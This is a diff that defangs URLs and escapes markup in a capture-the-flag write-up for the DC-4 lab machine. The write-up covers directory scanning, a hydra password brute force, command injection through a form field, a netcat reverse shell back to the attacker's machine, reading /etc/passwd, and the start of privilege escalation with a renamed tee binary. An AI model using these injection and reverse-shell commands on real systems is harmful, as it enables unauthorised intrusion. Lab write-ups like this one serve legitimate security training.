@@ -1,6 +1,6 @@
 # DC-4  
   
-**URL: http://www.five86.com/dc-4.html**  
+**URL: hxxp://www.five86.com/dc-4.html**  
   
 First of all, big thanks to @DCAU7 for sharing these machines with the community.   
   
@@ -26,61 +26,58 @@ root@kali:~# nmap -A 192.168.111.6
   
 The http just had a login page. Nothing more. Instead of going for the bruteforce, my first choice is to scan first. See if I can do anything without being logged in. First, let's scan:  
   
-root@kali:~# dirb http://192.168.111.6/ /usr/share/dirb/wordlists/big.txt -x /usr/share/dirb/wordlists/extensions_common.txt -r  
+root@kali:~# dirb hxxp://192.168.111.6/ /usr/share/dirb/wordlists/big.txt -x /usr/share/dirb/wordlists/extensions_common.txt -r  
 >  
->-----------------  
 >DIRB v2.22      
 >By The Dark Raver  
->-----------------  
 >  
 >START_TIME: Wed Apr 17 08:34:59 2019  
->URL_BASE: http://192.168.111.6/  
+>URL_BASE: hxxp://192.168.111.6/  
 >WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt  
 >EXTENSIONS_FILE: /usr/share/dirb/wordlists/extensions_common.txt | ()(.asp)(.aspx)(.bat)(.c)(.cfm)(.cgi)(.com)(.dll)(.exe)(.htm)(.html)(.inc)(.jhtml)(.jsa)(.jsp)(.log)(.mdb)(.nsf)(.php)(.phtml)(.pl)(.reg)(.sh)(.shtml)(.sql)(.txt)(.xml)(/) [NUM = 29]  
 >OPTION: Not Recursive  
 >  
->-----------------  
 >  
 >GENERATED WORDS: 20458                                                           
 >  
->---- Scanning URL: http://192.168.111.6/ ----  
->+ http://192.168.111.6/command.php (CODE:302|SIZE:704)                                                                          
->==> DIRECTORY: http://192.168.111.6/css/                                                                                        
->+ http://192.168.111.6/css/ (CODE:403|SIZE:556)                                                                                 
->==> DIRECTORY: http://192.168.111.6/images/                                                                                     
->+ http://192.168.111.6/images/ (CODE:403|SIZE:556)                                                                              
->+ http://192.168.111.6/index.php (CODE:200|SIZE:506)                                                                            
->+ http://192.168.111.6/login.php (CODE:302|SIZE:206)                                                                            
->+ http://192.168.111.6/logout.php (CODE:302|SIZE:163)          
+>---- Scanning URL: hxxp://192.168.111.6/ ----  
+>+ hxxp://192.168.111.6/command.php (CODE:302|SIZE:704)                                                                          
+>==\> DIRECTORY: hxxp://192.168.111.6/css/                                                                                        
+>+ hxxp://192.168.111.6/css/ (CODE:403|SIZE:556)                                                                                 
+>==\> DIRECTORY: hxxp://192.168.111.6/images/                                                                                     
+>+ hxxp://192.168.111.6/images/ (CODE:403|SIZE:556)                                                                              
+>+ hxxp://192.168.111.6/index.php (CODE:200|SIZE:506)                                                                            
+>+ hxxp://192.168.111.6/login.php (CODE:302|SIZE:206)                                                                            
+>+ hxxp://192.168.111.6/logout.php (CODE:302|SIZE:163)          
   
 Great, a command.php page. Let's see what we got here:  
   
-root@kali:~# curl -H 'Cookie: PHPSESSID=mf6fjsv8ve3ln8jchi3p0ue3i7' 'http://192.168.111.6/command.php'  
+root@kali:~# curl -H 'Cookie: PHPSESSID=mf6fjsv8ve3ln8jchi3p0ue3i7' 'hxxp://192.168.111.6/command.php'  
 >...  
->\<form method="post" action="command.php">  
->	\<strong>Run Command:\</strong>\<br>  
->	\<input type="radio" name="radio" value="ls -l" checked="checked">List Files\<br />  
->	\<input type="radio" name="radio" value="du -h">Disk Usage\<br />  
->	\<input type="radio" name="radio" value="df -h">Disk Free\<br />  
->	\<p>  
->	\<input type="submit" name="submit" value="Run">  
->\</form>  
->You need to be logged in to use this system.<p><a href='index.php'>Click to Log In Again</a>	  
+>\<form method="post" action="command.php"\>  
+>	\<strong\>Run Command:\</strong\>\<br\>  
+>	\<input type="radio" name="radio" value="ls -l" checked="checked"\>List Files\<br /\>  
+>	\<input type="radio" name="radio" value="du -h"\>Disk Usage\<br /\>  
+>	\<input type="radio" name="radio" value="df -h"\>Disk Free\<br /\>  
+>	\<p\>  
+>	\<input type="submit" name="submit" value="Run"\>  
+>\</form\>  
+>You need to be logged in to use this system.<p\><a href='index.php'\>Click to Log In Again</a\>	  
 >...  
   
 Wow, a radio parameter with a command to run in the server...  
   
-root@kali:~# curl -H 'Cookie: PHPSESSID=mf6fjsv8ve3ln8jchi3p0ue3i7' -d 'radio=ls+-l&submit=Run' 'http://192.168.111.6/command.php'  
+root@kali:~# curl -H 'Cookie: PHPSESSID=mf6fjsv8ve3ln8jchi3p0ue3i7' -d 'radio=ls+-l&submit=Run' 'hxxp://192.168.111.6/command.php'  
 >...  
->\<form method="post" action="command.php">  
->	\<strong>Run Command:\</strong>\<br>  
->	\<input type="radio" name="radio" value="ls -l" checked="checked">List Files\<br />  
->	\<input type="radio" name="radio" value="du -h">Disk Usage\<br />  
->	\<input type="radio" name="radio" value="df -h">Disk Free\<br />  
->	\<p>  
->	\<input type="submit" name="submit" value="Run">  
->\</form>  
->You need to be logged in to use this system.<p><a href='index.php'>Click to Log In Again</a>	  
+>\<form method="post" action="command.php"\>  
+>	\<strong\>Run Command:\</strong\>\<br\>  
+>	\<input type="radio" name="radio" value="ls -l" checked="checked"\>List Files\<br /\>  
+>	\<input type="radio" name="radio" value="du -h"\>Disk Usage\<br /\>  
+>	\<input type="radio" name="radio" value="df -h"\>Disk Free\<br /\>  
+>	\<p\>  
+>	\<input type="submit" name="submit" value="Run"\>  
+>\</form\>  
+>You need to be logged in to use this system.<p\><a href='index.php'\>Click to Log In Again</a\>	  
 >...  
   
 The same result...Here we can hope that the command is being executed but the result won't show if you are not logged in. Sounded great, but it was not the case. So, we are left with a bruteforce to the login panel... Let's run hydra:  
@@ -100,14 +97,14 @@ root@kali:~# hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.111.
   
 Here we go. Now we have our credentials: "Admin:happy" and we can start testing. First, let's see if we can change the command that is being executed:  
   
-root@kali:~# curl -H 'Cookie: PHPSESSID=mf6fjsv8ve3ln8jchi3p0ue3i7' -d 'radio=id&submit=Run'     'http://192.168.111.6/command.php'  
+root@kali:~# curl -H 'Cookie: PHPSESSID=mf6fjsv8ve3ln8jchi3p0ue3i7' -d 'radio=id&submit=Run'     'hxxp://192.168.111.6/command.php'  
 >...  
->You have selected: id\<br />\<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)  
+>You have selected: id\<br /\>\<pre\>uid=33(www-data) gid=33(www-data) groups=33(www-data)  
 >...  
   
 Now, just have to pup up a shell and have fun :)  
   
-root@kali:~# curl -H 'Cookie: PHPSESSID=mf6fjsv8ve3ln8jchi3p0ue3i7' -d 'radio=nc+192.168.111.5+4444+-e+/bin/bash&submit=Run' 'http://192.168.111.6/command.php' -v  
+root@kali:~# curl -H 'Cookie: PHPSESSID=mf6fjsv8ve3ln8jchi3p0ue3i7' -d 'radio=nc+192.168.111.5+4444+-e+/bin/bash&submit=Run' 'hxxp://192.168.111.6/command.php' -v  
   
 root@kali:~# nc -nlvp 4444  
 >listening on [any] 4444 ...  
@@ -127,9 +124,9 @@ Let's check if there are any users in this machine. After all, there was a SSH s
 www-data@dc-4:/usr/share/nginx/html$ cat /etc/passwd  
 >root:x:0:0:root:/root:/bin/bash  
 >...  
->charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash  
->jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash  
->sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash  
+>charles: x :1001:1001:Charles,,,:/home/charles:/bin/bash  
+>jim: x :1002:1002:Jim,,,:/home/jim:/bin/bash  
+>sam: x :1003:1003:Sam,,,:/home/sam:/bin/bash  
   
 Charles, Jim and SAM... With their own home folders...  
   
@@ -195,11 +192,11 @@ SMTP service running only in localhost? That's a little weird... any interesting
   
 jim@dc-4:~$ cat /var/spool/mail/jim   
 >From charles@dc-4 Sat Apr 06 21:15:46 2019  
->Return-path: \<charles@dc-4>  
+>Return-path: \<charles@dc-4\>  
 >Envelope-to: jim@dc-4  
 >Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000  
 >Received: from charles by dc-4 with local (Exim 4.89)  
->	(envelope-from \<charles@dc-4>)  
+>	(envelope-from \<charles@dc-4\>)  
 >	id 1hCjIX-0000kO-Qt  
 >	for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000  
 >To: jim@dc-4  
@@ -207,8 +204,8 @@ jim@dc-4:~$ cat /var/spool/mail/jim
 >MIME-Version: 1.0  
 >Content-Type: text/plain; charset="UTF-8"  
 >Content-Transfer-Encoding: 8bit  
->Message-Id: \<E1hCjIX-0000kO-Qt@dc-4>  
->From: Charles \<charles@dc-4>  
+>Message-Id: \<E1hCjIX-0000kO-Qt@dc-4\>  
+>From: Charles \<charles@dc-4\>  
 >Date: Sat, 06 Apr 2019 21:15:45 +1000  
 >Status: O  
 >  
@@ -221,7 +218,7 @@ jim@dc-4:~$ cat /var/spool/mail/jim
 >See ya,  
 >Charles  
   
-Hi Charles :D, great... Charles gave us a mission. Let's see if anything went wrong during his holidays >.<  
+Hi Charles :D, great... Charles gave us a mission. Let's see if anything went wrong during his holidays \>.<  
   
 ### PRIVILEGE ESCALATION  
   
@@ -261,9 +258,9 @@ charles@dc-4:/home/jim$ /usr/bin/teehee --help
 >exit immediately on error writing to a pipe, and diagnose errors  
 >writing to non pipe outputs.  
 >  
->GNU coreutils online help: <http://www.gnu.org/software/coreutils/>  
->Report tee translation bugs to <http://translationproject.org/team/>  
->Full documentation at: <http://www.gnu.org/software/coreutils/tee>  
+>GNU coreutils online help: <hxxp://www.gnu.org/software/coreutils/\>  
+>Report tee translation bugs to <hxxp://translationproject.org/team/\>  
+>Full documentation at: <hxxp://www.gnu.org/software/coreutils/tee\>  
 >or available locally via: info '(coreutils) tee invocation'  
   
 Great, tee. I can think at list in a couple files that I can edit to do the privilege escalation. Let's go easy and make us sudo masters ^^  
